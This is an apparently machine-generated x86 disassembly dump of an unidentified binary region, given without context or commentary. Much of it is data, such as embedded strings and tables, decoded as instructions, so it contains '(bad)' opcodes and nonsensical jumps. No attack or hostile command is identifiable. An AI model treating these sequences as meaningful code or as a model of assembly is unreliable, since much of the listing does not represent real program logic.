  421abe:	cmp    DWORD PTR [esi+0x79],ecx
  421ac1:	dec    esi
  421ac2:	xor    BYTE PTR [esi-0x79],cl
  421ac5:	dec    edi
  421ac6:	cmp    eax,0x3e4faf4e
  421acb:	dec    esi
  421acc:	js     0x421b1c
  421ace:	cmp    ecx,DWORD PTR [esi-0x64]
  421ad1:	dec    edi
  421ad2:	inc    esp
  421ad3:	dec    esi
  421ad4:	mov    DWORD PTR [edi+0x41],ecx
  421ad7:	dec    esi
  421ad8:	xor    BYTE PTR [esi+0x40],cl
  421adb:	dec    esi
  421adc:	pop    esp
  421add:	ins    DWORD PTR es:[edi],dx
  421ade:	pop    edi
  421adf:	bound  edi,QWORD PTR [ecx]
  421ae1:	dec    esi
  421ae2:	jns    0x421b32
  421ae4:	xor    BYTE PTR [esi-0x80],cl
  421ae7:	dec    edi
  421ae8:	cmp    eax,0x394e734e
  421aed:	dec    esi
  421aee:	mov    ds:0x304e3a4f,al
  421af3:	dec    esi
  421af4:	inc    esi
  421af5:	dec    esi
  421af6:	pop    esp
  421af7:	jge    0x421b58
  421af9:	jb     0x421b6a
  421afb:	sub    BYTE PTR [esi-0x7d],0x7e
  421aff:	xchg   ebx,eax
  421b00:	jns    0x421a92
  421b02:	aas    
  421b03:	dec    esi
  421b04:	test   BYTE PTR [edi+0x30],cl
  421b07:	dec    esi
  421b08:	test   BYTE PTR [edi+0x3c],cl
  421b0b:	dec    esi
  421b0c:	mov    ds:0x734e394f,al
  421b11:	dec    esi
  421b12:	inc    ebp
  421b13:	dec    esi
  421b14:	xor    BYTE PTR [esi+0x44],cl
  421b17:	dec    esi
  421b18:	pop    esp
  421b19:	lea    ebx,[edi-0x7e]
  421b1c:	outs   dx,DWORD PTR ds:[esi]
  421b1d:	xchg   edx,eax
  421b1e:	outs   dx,BYTE PTR ds:[esi]
  421b1f:	xchg   ebx,eax
  421b20:	jle    0x421ac5
  421b22:	jns    0x421ac4
  421b24:	aas    
  421b25:	dec    esi
  421b26:	test   BYTE PTR [edi+0x30],cl
  421b29:	dec    esi
  421b2a:	test   BYTE PTR [edi+0x3c],cl
  421b2d:	dec    esi
  421b2e:	mov    ds:0x894e394f,al
  421b33:	dec    edi
  421b34:	inc    ebp
  421b35:	dec    esi
  421b36:	xor    BYTE PTR [esi+0x44],cl
  421b39:	dec    esi
  421b3a:	pop    esp
  421b3b:	popf   
  421b3c:	pop    edi
  421b3d:	xchg   edx,eax
  421b3e:	outs   dx,DWORD PTR ds:[esi]
  421b3f:	mov    ds:0xb37ea36e,al
  421b44:	jns    0x421af6
  421b46:	aas    
  421b47:	dec    esi
  421b48:	mov    cs,WORD PTR [edi+0x30]
  421b4b:	dec    esi
  421b4c:	lods   al,BYTE PTR ds:[esi]
  421b4d:	dec    edi
  421b4e:	cmp    eax,0x394e734e
  421b53:	dec    esi
  421b54:	mov    eax,ds:0x304e3a4f
  421b59:	dec    esi
  421b5a:	inc    esp
  421b5b:	dec    esi
  421b5c:	pop    esp
  421b5d:	lods   eax,DWORD PTR ds:[esi]
  421b5e:	pop    edi
  421b5f:	mov    ds:0xb36eb26f,al
  421b64:	jle    0x421b29
  421b66:	jns    0x421b28
  421b68:	aas    
  421b69:	dec    esi
  421b6a:	mov    cs,WORD PTR [edi+0x30]
  421b6d:	dec    esi
  421b6e:	lods   al,BYTE PTR ds:[esi]
  421b6f:	dec    edi
  421b70:	cmp    eax,0x394e7e4e
  421b75:	dec    esi
  421b76:	lahf   
  421b77:	dec    edi
  421b78:	cmp    ecx,DWORD PTR [esi+0x30]
  421b7b:	dec    esi
  421b7c:	inc    ebp
  421b7d:	dec    esi
  421b7e:	pop    esp
  421b7f:	mov    ebp,0xc26fb25f
  421b84:	outs   dx,BYTE PTR ds:[esi]
  421b85:	ret    
  421b86:	jle    0x421b5b
  421b88:	jns    0x421b5a
  421b8a:	aas    
  421b8b:	dec    esi
  421b8c:	mov    cs,WORD PTR [edi+0x30]
  421b8f:	dec    esi
  421b90:	lods   al,BYTE PTR ds:[esi]
  421b91:	dec    edi
  421b92:	cmp    eax,0x394f804e
  421b97:	dec    esi
  421b98:	lods   al,BYTE PTR ds:[esi]
  421b99:	dec    edi
  421b9a:	cmp    cl,BYTE PTR [esi+0x30]
  421b9d:	dec    esi
  421b9e:	inc    esi
  421b9f:	dec    esi
  421ba0:	pop    esp
  421ba1:	int    0x5f
  421ba3:	ret    0xd26f
  421ba6:	outs   dx,BYTE PTR ds:[esi]
  421ba7:	sar    DWORD PTR [esi-0x1d],cl
  421baa:	jns    0x421b8c
  421bac:	aas    
  421bad:	dec    esi
  421bae:	mov    cs,WORD PTR [edi+0x30]
  421bb1:	dec    esi
  421bb2:	lods   al,BYTE PTR ds:[esi]
  421bb3:	dec    edi
  421bb4:	cmp    eax,0x394f834e
  421bb9:	dec    esi
  421bba:	mov    ds:0x304e3a4f,al
  421bbf:	dec    esi
  421bc0:	inc    esp
  421bc1:	dec    esi
  421bc2:	pop    esp
  421bc3:	fstp   QWORD PTR [edi-0x2e]
  421bc6:	outs   dx,DWORD PTR ds:[esi]
  421bc7:	loop   0x421c37
  421bc9:	jecxz  0x421c49
  421bcb:	repz jns 0x421bbe
  421bce:	aas    
  421bcf:	dec    esi
  421bd0:	lea    ecx,[edi+0x30]
  421bd3:	dec    esi
  421bd4:	lahf   
  421bd5:	dec    edi
  421bd6:	cmp    eax,0x3c4fa04e
  421bdb:	dec    esi
  421bdc:	xor    BYTE PTR [esi+0x3f],cl
  421bdf:	dec    esi
  421be0:	pop    esp
  421be1:	in     eax,dx
  421be2:	pop    edi
  421be3:	loop   0x421c54
  421be5:	repnz outs dx,BYTE PTR ds:[esi]
  421be7:	repz jle 0x421bed
  421bea:	jns    0x421bec
  421bec:	jle    0x421c01
  421bee:	jns    0x421c00
  421bf0:	cmp    al,0x4e
  421bf2:	jg     0x421c42
  421bf4:	xor    BYTE PTR [esi-0x65],cl
  421bf7:	dec    edi
  421bf8:	xor    cl,BYTE PTR [esi-0x80]
  421bfb:	dec    edi
  421bfc:	cmp    al,0x4e
  421bfe:	lods   eax,DWORD PTR ds:[esi]
  421bff:	dec    edi
  421c00:	cmp    ecx,DWORD PTR [esi+0x30]
  421c03:	dec    esi
  421c04:	inc    ebp
  421c05:	dec    esi
  421c06:	pop    esp
  421c07:	or     eax,0x126f025f
  421c0c:	outs   dx,BYTE PTR ds:[esi]
  421c0d:	adc    edi,DWORD PTR [esi+0x23]
  421c10:	jns    0x421c32
  421c12:	aas    
  421c13:	dec    esi
  421c14:	add    BYTE PTR [eax],al
  421c16:	sahf   
  421c17:	sbb    al,BYTE PTR [edx+0x0]
  421c1a:	xchg   edx,eax
  421c1b:	sbb    al,0x42
  421c1d:	add    BYTE PTR [edx+0x4200421c],bl
  421c23:	push   ds
  421c24:	inc    edx
  421c25:	add    BYTE PTR [esi+0x3200421d],ch
  421c2b:	push   ds
  421c2c:	inc    edx
  421c2d:	add    BYTE PTR [edx+0x1c],bh
  421c30:	inc    edx
  421c31:	add    BYTE PTR [esi+0x1c],bh
  421c34:	inc    edx
  421c35:	add    BYTE PTR [esi],ch
  421c37:	push   ds
  421c38:	inc    edx
  421c39:	add    dl,ah
  421c3b:	sbb    al,0x42
  421c3d:	add    BYTE PTR ds:0x36f89ca9,cl
  421c43:	mov    edx,0x1c96f89c
  421c48:	inc    edx
  421c49:	add    BYTE PTR [esi+0x1d],ah
  421c4c:	inc    edx
  421c4d:	add    BYTE PTR [edx+0x1d],bh
  421c50:	inc    edx
  421c51:	add    BYTE PTR [esi-0x69ffbde3],al
  421c57:	sbb    eax,0x1cce0042
  421c5c:	inc    edx
  421c5d:	add    BYTE PTR [edx-0x11ffbde6],bl
  421c63:	sbb    al,0x42
  421c65:	add    dh,bl
  421c67:	sbb    al,0x42
  421c69:	add    BYTE PTR [esi+0x1e],al
  421c6c:	inc    edx
  421c6d:	add    BYTE PTR [esi+0x19f89c85],dh
  421c73:	or     edx,DWORD PTR [edi]
  421c75:	and    DWORD PTR [edx+0x1400421c],0x881161c
  421c7f:	or     eax,0x705
  421c84:	inc    eax
  421c85:	add    BYTE PTR [edx],bh
  421c87:	inc    edx
  421c88:	ds ds enter 0x4279,0x0
  421c8e:	ins    DWORD PTR es:[edi],dx
  421c8f:	push   ebp
  421c90:	inc    esp
  421c91:	imul   ecx,DWORD PTR [eax],0x86275fa
  421c97:	in     eax,dx
  421c98:	inc    BYTE PTR [edi]
  421c9a:	aas    
  421c9b:	cli    
  421c9c:	mov    ds:0x421c8a05,eax
  421ca1:	add    BYTE PTR [ebp-0x4a07636b],dh
  421ca7:	xchg   esi,eax
  421ca8:	pushf  
  421ca9:	clc    
  421caa:	mov    ah,0x95
  421cac:	pushf  
  421cad:	clc    
  421cae:	mov    ebx,0xbaf89c95
  421cb3:	xchg   ebp,eax
  421cb4:	pushf  
  421cb5:	clc    
  421cb6:	mov    ecx,0xb8f89c95
  421cbb:	xchg   ebp,eax
  421cbc:	pushf  
  421cbd:	clc    
  421cbe:	mov    edi,0xbef89c95
  421cc3:	xchg   ebp,eax
  421cc4:	pushf  
  421cc5:	clc    
  421cc6:	mov    ebp,0xa6f89c95
  421ccb:	xchg   ebp,eax
  421ccc:	pushf  
  421ccd:	clc    
  421cce:	jmp    0x421a:0x926003f9
  421cd5:	add    BYTE PTR [eax+eax*2+0x42],ch
  421cd9:	add    BYTE PTR [ebx+0x77],dl
  421cdc:	jbe    0x421d2e
  421cde:	mov    dh,0x85
  421ce0:	pushf  
  421ce1:	clc    
  421ce2:	sbb    ecx,ebp
  421ce4:	push   eax
  421ce5:	pop    es
  421ce6:	sbb    BYTE PTR [ebx],cl
  421ce8:	add    BYTE PTR [eax],al
  421cea:	mov    ds,WORD PTR [edx]
  421cec:	inc    edx
  421ced:	add    BYTE PTR [ebx],bl
  421cef:	or     eax,DWORD PTR [esi+ecx*1]
	...
  421d22:	ins    BYTE PTR es:[edi],dx
  421d23:	inc    eax
  421d24:	inc    edx
  421d25:	add    BYTE PTR [esi+0x66f89c85],dh
  421d2b:	add    BYTE PTR [edx+0x0],ch
  421d2e:	add    BYTE PTR [si+0x0],ah
  421d32:	push   0x64006700
  421d37:	add    BYTE PTR [esi+0x0],ah
  421d3a:	push   0x0
  421d3c:	push   0x66006400
  421d41:	add    BYTE PTR [edi+0x0],ah
  421d44:	push   0x0
  421d46:	push   0x66006700
  421d4b:	add    BYTE PTR [eax+0x0],ch
  421d4e:	add    BYTE PTR [bp+0x0],ah
  421d52:	push   0x66006700
	...
  421d5f:	add    BYTE PTR [eax],al
  421d61:	add    BYTE PTR [ecx-0x5affbfa4],cl
  421d67:	dec    edi
  421d68:	lahf   
  421d69:	dec    edi
  421d6a:	mov    ds:0x9f4fa64f,al
  421d6f:	dec    edi
  421d70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d71:	dec    edi
  421d72:	ins    DWORD PTR es:[edi],dx
  421d73:	dec    esi
  421d74:	bound  ecx,QWORD PTR [esi+0x30]
  421d77:	dec    esi
  421d78:	add    BYTE PTR [eax],al
  421d7a:	cdq    
  421d7b:	dec    edi
  421d7c:	pushf  
  421d7d:	dec    edi
  421d7e:	fwait
  421d7f:	dec    edi
  421d80:	ins    DWORD PTR es:[edi],dx
  421d81:	dec    esi
  421d82:	bound  ecx,QWORD PTR [esi+0x30]
  421d85:	dec    esi
  421d86:	scas   eax,DWORD PTR es:[edi]
  421d87:	dec    edi
  421d88:	lods   eax,DWORD PTR ds:[esi]
  421d89:	dec    edi
  421d8a:	lahf   
  421d8b:	dec    edi
  421d8c:	mov    ds:0x624e6d4f,al
  421d91:	dec    esi
  421d92:	xor    BYTE PTR [esi+0x0],cl
  421d95:	add    BYTE PTR [ebp-0x5bb067b1],ch
  421d9b:	dec    edi
  421d9c:	test   eax,0xa04f934f
  421da1:	dec    edi
  421da2:	fwait
  421da3:	dec    edi
  421da4:	xor    BYTE PTR [esi+0x0],cl
  421da7:	add    BYTE PTR [eax],al
  421da9:	add    BYTE PTR [eax],al
  421dab:	add    BYTE PTR [eax],al
  421dad:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  421db4:	mov    WORD PTR [ebp-0x32734274],gs
  421dba:	mov    ebp,ds
  421dbc:	mov    ebp,gs
  421dbe:	mov    ebp,?
  421dc0:	mov    WORD PTR ds:0x2d8c1d8c,cs
  421dc6:	mov    WORD PTR ds:0x6d8c5d8c,?
  421dcc:	mov    WORD PTR [edx-0x74],?
  421dcf:	jae    0x421d5d
  421dd1:	jo     0x421d5f
  421dd3:	jno    0x421d61
  421dd5:	jbe    0x421d63
  421dd7:	ja     0x421d65
  421dd9:	je     0x421d67
  421ddb:	jne    0x421d69
  421ddd:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  421de4:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  421dea:	lods   al,BYTE PTR ds:[esi]
  421deb:	jge    0x421da9
  421ded:	jge    0x421d8d
  421def:	(bad)  
  421df0:	jns    0x421e65
  421df2:	mov    ecx,0x7d738cb1
  421df7:	ins    DWORD PTR es:[edi],dx
  421df8:	enter  0x9fc6,0x26
  421dfc:	jb     0x421e01
  421dfe:	test   eax,0xb956bb17
  421e03:	hlt    
  421e04:	test   al,0x37
  421e06:	test   al,0x7e
  421e08:	fnstenv [ecx-0x6a]
  421e0b:	mov    cl,0x6a
  421e0d:	push   0xffffffce
  421e0f:	or     BYTE PTR [edx],bl
  421e11:	xlat   BYTE PTR ds:[ebx]
  421e12:	out    dx,eax
  421e13:	add    eax,0x9321d7aa
  421e18:	scas   al,BYTE PTR es:[edi]
  421e19:	adc    DWORD PTR [esi],esp
  421e1b:	jge    0x421e40
  421e1d:	fidiv  WORD PTR [edi]
  421e1f:	leave  
  421e20:	hlt    
  421e21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e22:	cmp    ax,0x1fc8
  421e26:	mov    dh,cl
  421e28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e29:	(bad)  
  421e2a:	and    DWORD PTR [eax],ebx
  421e2c:	and    DWORD PTR [ecx-0x18],esi
  421e2f:	(bad)  [ebx+0x7]
  421e32:	cmc    
  421e33:	enter  0x301a,0x14
  421e37:	inc    eax
  421e38:	inc    edx
  421e39:	add    BYTE PTR [ecx+0x66],dh
  421e3c:	jp     0x421eac
  421e3e:	sbb    BYTE PTR [edx+eax*2],0x0
  421e42:	out    0x1c,al
  421e44:	inc    edx
  421e45:	add    BYTE PTR [eax],cl
  421e47:	in     eax,dx
  421e48:	adc    al,BYTE PTR [edi]
  421e4a:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  421e51:	ins    BYTE PTR es:[edi],dx
  421e52:	push   0x49657557
  421e57:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  421e5d:	push   edi
  421e5e:	jp     0x421eda
  421e60:	dec    ebp
  421e61:	push   esi
  421e62:	arpl   WORD PTR gs:[ecx+0x45],si
  421e66:	dec    edx
  421e67:	dec    esi
  421e68:	data16 ja 0x421eb9
  421e6b:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
	...
  421e86:	inc    ebp
  421e87:	push   edx
  421e88:	jb     0x421efe
  421e8a:	inc    esi
  421e8b:	je     0x421ece
  421e8d:	inc    esi
  421e8e:	jae    0x421f06
  421e90:	dec    ebx
  421e91:	gs dec ecx
  421e93:	dec    ebp
  421e94:	dec    ebp
  421e95:	pop    edx
  421e96:	jp     0x421ef2
  421e98:	jbe    0x421ee0
  421e9a:	pop    ecx
  421e9b:	jo     0x421f15
  421e9d:	inc    edi
  421e9e:	gs ins BYTE PTR es:[edi],dx
  421ea0:	dec    esp
  421ea1:	js     0x421f0b
  421ea3:	inc    edx
  421ea4:	js     0x421eec
  421ea6:	dec    eax
  421ea7:	inc    ebp
  421ea8:	inc    esp
  421ea9:	inc    esp
  421eaa:	push   ecx
  421eab:	dec    edx
  421eac:	ins    BYTE PTR es:[edi],dx
  421ead:	dec    ebx
  421eae:	jbe    0x421f1e
  421eb0:	pop    eax
  421eb1:	jbe    0x421efe
  421eb3:	inc    ecx
  421eb4:	fs gs jno 0x421f25
  421eb8:	push   ebx
  421eb9:	inc    ecx
  421eba:	add    BYTE PTR [eax],al
  421ebc:	inc    ebx
  421ebd:	outs   dx,BYTE PTR ds:[esi]
  421ebe:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  421ec2:	push   edx
  421ec3:	push   ecx
  421ec4:	push   0x74000064
  421ec9:	jne    0x421f40
  421ecb:	ins    DWORD PTR es:[edi],dx
  421ecc:	push   ecx
  421ecd:	push   eax
  421ece:	jo     0x421f4a
  421ed0:	addr16 jo 0x421f29
  421ed3:	pop    eax
  421ed4:	add    BYTE PTR [eax],al
  421ed6:	push   ecx
  421ed7:	pop    ecx
  421ed8:	inc    ebx
  421ed9:	inc    edx
  421eda:	outs   dx,BYTE PTR ds:[esi]
  421edb:	popa   
  421edc:	imul   eax,DWORD PTR [edx+0x61],0x6b
  421ee0:	jne    0x421f50
  421ee2:	dec    ebx
  421ee3:	je     0x421f48
  421ee5:	bound  esp,QWORD PTR [edi+0x0]
  421ee8:	jns    0x421f2f
  421eea:	bound  ebp,QWORD PTR [ecx+0x46]
  421eed:	dec    ecx
  421eee:	ja     0x421f35
  421ef0:	dec    eax
  421ef1:	inc    ebp
  421ef2:	inc    edx
  421ef3:	push   ebx
  421ef4:	add    BYTE PTR [eax],al
  421ef6:	outs   dx,DWORD PTR ds:[esi]
  421ef7:	inc    edi
  421ef8:	dec    esi
  421ef9:	outs   dx,DWORD PTR ds:[esi]
  421efa:	pop    ecx
  421efb:	inc    edi
  421efc:	jb     0x421f45
  421efe:	jns    0x421f76
  421f00:	inc    ecx
  421f01:	pop    eax
  421f02:	dec    esp
  421f03:	add    BYTE PTR [eax+0x48],bh
  421f06:	bound  edx,QWORD PTR [ebx+0x43]
  421f09:	pop    eax
  421f0a:	outs   dx,DWORD PTR ds:[esi]
  421f0b:	push   0x4355
  421f10:	dec    esp
  421f11:	ins    BYTE PTR es:[edi],dx
  421f12:	inc    edx
  421f13:	push   0x76666a73
  421f18:	inc    edx
  421f19:	jo     0x421f1b
  421f1b:	add    BYTE PTR [eax],al
  421f1d:	add    BYTE PTR [edi+0x6d],ah
  421f20:	je     0x421f69
  421f22:	ins    BYTE PTR es:[edi],dx
  421f23:	jae    0x421f8f
  421f25:	inc    esi
  421f26:	ins    DWORD PTR es:[edi],dx
  421f27:	je     0x421f7f
  421f29:	push   0x56584178
  421f2e:	push   ebx
  421f2f:	addr16 dec edx
  421f31:	jo     0x421fa5
  421f33:	js     0x421fa4
  421f35:	pop    eax
  421f36:	dec    ebx
  421f37:	push   esp
  421f38:	dec    esp
  421f39:	jns    0x421f86
  421f3b:	js     0x421fb5
  421f3d:	outs   dx,BYTE PTR ds:[esi]
  421f3e:	pop    ecx
  421f3f:	jae    0x421faf
  421f41:	push   0x43644448
  421f46:	arpl   WORD PTR [edx+0x55],sp
  421f49:	push   0x42504e67
  421f4e:	push   ebp
  421f4f:	je     0x421fc6
  421f51:	addr16 dec edi
  421f53:	dec    esp
  421f54:	inc    edx
  421f55:	ins    DWORD PTR es:[edi],dx
  421f56:	inc    esi
  421f57:	inc    esi
  421f58:	inc    esi
  421f59:	arpl   WORD PTR [edx+0x47],bx
  421f5c:	push   ebp
  421f5d:	inc    ebx
  421f5e:	popa   
  421f5f:	push   edx
  421f60:	dec    esp
  421f61:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  421f68:	push   ecx
  421f69:	push   ebx
  421f6a:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  421f71:	dec    edx
  421f72:	jns    0x421fdd
  421f74:	push   edx
  421f75:	inc    ebx
  421f76:	jo     0x421fed
  421f78:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  421f7c:	fs push ebx
  421f7e:	inc    ebx
  421f7f:	push   ebp
  421f80:	push   eax
  421f81:	ja     0x421fbe
  421f83:	fisttp QWORD PTR [ebp+ebp*4-0x12]
  421f87:	mov    ebp,0xa53ddffb
  421f8c:	js     0x421f47
  421f8e:	mov    edx,0x41d273f9
  421f93:	(bad)  
  421f94:	add    DWORD PTR [eax],eax
  421f96:	pop    edx
  421f97:	add    BYTE PTR [eax],al
  421f99:	add    BYTE PTR [edi],dl
  421f9b:	jl     0x42200d
  421f9d:	sar    DWORD PTR [edi],1
  421f9f:	out    0x50,al
  421fa1:	add    ah,BYTE PTR [ecx]
  421fa3:	xchg   esi,eax
  421fa4:	or     BYTE PTR [esi+0x1438e7de],ah
  421faa:	jp     0x421f80
  421fac:	pushf  
  421fad:	xchg   esp,eax
  421fae:	addr16 xchg esp,eax
  421fb0:	cs inc esi
  421fb2:	xchg   edi,eax
  421fb3:	cdq    
  421fb4:	hlt    
  421fb5:	mov    BYTE PTR [esp+ebx*4],cl
  421fb8:	(bad)  
  421fba:	mov    esp,0x6d5050c2
  421fbf:	push   esi
  421fc0:	jnp    0x421f93
  421fc2:	mov    eax,ds:0x9e2849a6
  421fc7:	mov    ebx,ebp
  421fc9:	jle    0x421fea
  421fcb:	push   esi
  421fcc:	aad    0xad
  421fce:	sahf   
  421fcf:	inc    edi
  421fd0:	aad    0x40
  421fd2:	je     0x421f7d
  421fd4:	dec    esp
  421fd5:	adc    al,0xf4
  421fd7:	jmp    0x421fd2
  421fd9:	xor    edi,DWORD PTR [edi+0x74]
  421fdc:	out    0xce,eax
  421fde:	pop    ebp
  421fdf:	xlat   BYTE PTR ds:[ebx]
  421fe0:	pop    ebx
  421fe1:	sub    DWORD PTR [ebx],ecx
  421fe3:	jmp    0x54d089da
  421fe8:	mov    al,ds:0x6517f48d
  421fed:	mov    WORD PTR [ebx+0x6d93c837],ds
  421ff3:	pop    ebx
	...
  422000:	add    BYTE PTR [eax],al
  422002:	sub    BYTE PTR [edx+0x57bf52a5],dh
  422008:	(bad)  
  422009:	cli    
  42200a:	jl     0x422070
  42200c:	xlat   BYTE PTR ds:[ebx]
  42200d:	push   esi
  42200e:	push   0xffffff96
  422010:	push   0x1d69b37
  422015:	add    BYTE PTR [edx+0x0],bl
  422018:	add    BYTE PTR [eax],al
  42201a:	imul   ecx,DWORD PTR [esi+esi*1-0x37],0x7dc8ac63
  422022:	clc    
  422023:	adc    cl,BYTE PTR [eax]
  422025:	xor    esi,DWORD PTR [ecx]
  422027:	fucom  st(2)
  422029:	add    eax,0x5851916b
  42202e:	mov    dl,0x2
  422030:	gs cwde 
  422032:	adc    ecx,DWORD PTR [esi-0x1c]
  422035:	ror    BYTE PTR [ebx-0x7d8ccce8],1
  42203b:	rcr    BYTE PTR [esi-0x37],cl
  42203e:	jo     0x4220a2
  422040:	or     BYTE PTR [ebx-0x9fa877b],cl
  422046:	pop    eax
  422047:	out    0x2c,al
  422049:	jo     0x422031
  42204b:	adc    eax,0x6c43897a
  422050:	retf   0x3f7e
  422053:	(bad)  
  422054:	jmp    0x422044
  422056:	sub    ebx,DWORD PTR [edi+0x3c31825f]
  42205c:	(bad)  
  42205d:	out    dx,eax
  42205e:	or     DWORD PTR [edx],ebx
  422060:	mov    cl,0xe8
  422062:	mov    gs,WORD PTR [ebx]
  422064:	sbb    esp,DWORD PTR [ebp+0x5706ce6f]
  42206a:	mov    bh,0xd0
  42206c:	jb     0x4220b2
  42206e:	xor    ebx,DWORD PTR [esi+edi*8+0x0]
  422072:	jg     0x42201c
	...
  422080:	add    BYTE PTR [eax],al
  422082:	mov    bl,0x55
  422084:	jg     0x422007
  422086:	jmp    FWORD PTR [ebx-0x69418801]
  42208c:	push   0x58d31d57
  422091:	pop    es
  422092:	cmc    
  422093:	(bad)  
  422094:	add    DWORD PTR [eax],eax
  422096:	pop    edx
  422097:	add    BYTE PTR [eax],al
  422099:	add    BYTE PTR [edi+0x61],al
  42209c:	mov    dh,0x8f
  42209e:	pop    esi
  42209f:	mov    BYTE PTR [edi],0x3d
  4220a2:	adc    ch,BYTE PTR [edi-0x18]
  4220a5:	fnsave [ebx+0x19ce5ec2]
  4220ab:	test   eax,0x468a0439
  4220b0:	lods   eax,DWORD PTR ds:[esi]
  4220b1:	xchg   esp,eax
  4220b2:	jnp    0x4220bf
  4220b4:	mov    esi,0x37c55796
  4220b9:	mov    eax,ds:0xfc13ec31
  4220be:	stos   BYTE PTR es:[edi],al
  4220bf:	jl     0x42211e
  4220c1:	xchg   ebx,eax
  4220c2:	stos   BYTE PTR es:[edi],al
  4220c3:	cmc    
  4220c4:	cmp    DWORD PTR [esi],esi
  4220c6:	pop    eax
  4220c7:	in     al,0x60
  4220c9:	and    eax,0x49932204
  4220ce:	rdmsr  
  4220d0:	jo     0x42213c
  4220d2:	mov    ebx,ebp
  4220d4:	jl     0x4220a6
  4220d6:	dec    eax
  4220d7:	jno    0x422061
  4220d9:	push   0x7b
  4220db:	jo     0x42214c
  4220dd:	aas    
  4220de:	sbb    ah,bl
  4220e0:	in     al,0xd9
  4220e2:	mov    eax,0xdddf4d83
  4220e7:	mov    bl,0x79
  4220e9:	das    
  4220ea:	call   0xce8f:0xb979328d
  4220f1:	push   ebp
  4220f2:	sbb    BYTE PTR [ecx],dh
	...
  422100:	add    BYTE PTR [eax],al
  422102:	cmp    dh,dl
  422104:	cmp    ah,BYTE PTR [esi+edi*8]
  422107:	in     al,dx
  422108:	fimul  WORD PTR ds:[edi+0x4bac6bd5]
  42210f:	sub    DWORD PTR [ecx+0x1d74f29],ebp
  422115:	add    BYTE PTR [edx+0x0],bl
  422118:	add    BYTE PTR [eax],al
  42211a:	aas    
  42211b:	xor    dh,BYTE PTR [edi]
  42211d:	outs   dx,DWORD PTR ds:[esi]
  42211e:	xor    ch,BYTE PTR [ebp+edi*8+0x0]
  422122:	mov    esi,0xa3c109d
  422127:	adc    ebp,DWORD PTR [eax-0x5c]
  42212a:	addr16 sbb al,0x8f
  42212d:	and    ebx,ebp
  42212f:	dec    ebx
  422130:	jno    0x422196
  422132:	pop    eax
  422133:	inc    ecx
  422134:	leave  
  422135:	loope  0x422121
  422137:	push   edi
  422138:	mov    ebp,0x96a1739
  42213d:	popf   
  42213e:	lods   al,BYTE PTR ds:[esi]
  42213f:	sub    DWORD PTR [esi],esp
  422141:	mov    bh,0x26
  422143:	cmp    edx,DWORD PTR [edi+0x77]
  422146:	fmul   QWORD PTR [ebp-0x43]
  422149:	add    cl,bl
  42214b:	(bad)  
  42214d:	inc    edi
  42214e:	push   eax
  42214f:	lods   al,BYTE PTR ds:[esi]
  422150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422151:	lahf   
  422152:	or     edi,DWORD PTR [eax-0x227edcdc]
  422158:	test   al,0x2f
  42215a:	ss adc al,0xbc
  42215d:	retf   0xc4f4
  422160:	xor    eax,0x746e0f8c
  422165:	inc    ebx
  422166:	pop    edx
  422167:	rcl    BYTE PTR [ebx+0x16],1
  42216a:	pop    ebp
  42216b:	popa   
  42216c:	jno    0x4221e3
  42216e:	jbe    0x422179
  422170:	nop
  422171:	outs   dx,BYTE PTR ds:[esi]
  422172:	icebp  
  422173:	push   es
	...
  422180:	add    BYTE PTR [eax],al
  422182:	fnstenv [esi-0x2490e49a]
  422188:	std    
  422189:	neg    BYTE PTR [esi]
  42218b:	sub    esp,DWORD PTR [ebx-0x23]
  42218e:	add    ebx,DWORD PTR [edx]
  422190:	dec    esp
  422191:	fsubr  QWORD PTR [ecx+0x5a0001d7]
  422197:	add    BYTE PTR [eax],al
  422199:	add    BYTE PTR [edi+0x6f],cl
  42219c:	stos   DWORD PTR es:[edi],eax
  42219d:	xor    bh,BYTE PTR [ebx+0x4d]
  4221a0:	dec    edi
  4221a1:	ss out dx,al
  4221a3:	add    ax,0x42f4
  4221a7:	sbb    ax,0xc183
  4221ab:	cmc    
  4221ac:	cmp    esi,ebp
  4221ae:	mov    ah,0x27
  4221b0:	mov    dh,0x2b
  4221b2:	xor    edx,ebp
  4221b4:	sub    DWORD PTR [eax+ebp*1-0x2aa03258],edi
  4221bb:	and    DWORD PTR [eax+ecx*2-0x53f719b9],esi
  4221c2:	(bad)  
  4221c3:	push   cs
  4221c4:	mov    ds:0xc44d5ea5,al
  4221c9:	adc    DWORD PTR [eax+eax*2-0x21],0x16ede245
  4221d1:	dec    ebx
  4221d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221d3:	mov    ch,bl
  4221d5:	jns    0x42218b
  4221d7:	inc    ebx
  4221d8:	mov    eax,0x93fa597a
  4221dd:	cwde   
  4221de:	dec    eax
  4221df:	xor    esp,DWORD PTR [ebx-0x7ca4cc10]
  4221e5:	loope  0x42225c
  4221e7:	aas    
  4221e8:	out    0xac,eax
  4221ea:	aad    0x87
  4221ec:	jne    0x4221d7
  4221ee:	pusha  
  4221ef:	(bad)  
  4221f0:	leave  
  4221f1:	fmul   st,st(0)
  4221f3:	cmp    DWORD PTR [eax],eax
	...
  422201:	add    dl,bl
  422203:	xor    dl,BYTE PTR [edi-0x20500076]
  422209:	jb     0x42220e
  42220b:	inc    ebp
  42220c:	mov    ds:0xf0e04d5c,eax
  422211:	xchg   edx,eax
  422212:	add    ebx,eax
  422214:	add    DWORD PTR [eax],eax
  422216:	pop    edx
  422217:	add    BYTE PTR [eax],al
  422219:	add    BYTE PTR [esi+0x357c8f48],bh
  42221f:	ror    BYTE PTR [ecx+0x2ed57ef9],cl
  422225:	in     eax,dx
  422226:	adc    al,0xfb
  422228:	call   0x4b23:0x3f1a8a11
  42222f:	xchg   BYTE PTR [ebp+0x7e11c74d],ah
  422235:	sbb    al,0xfa
  422237:	lods   al,BYTE PTR ds:[esi]
  422238:	mul    eax
  42223a:	cli    
  42223b:	push   esp
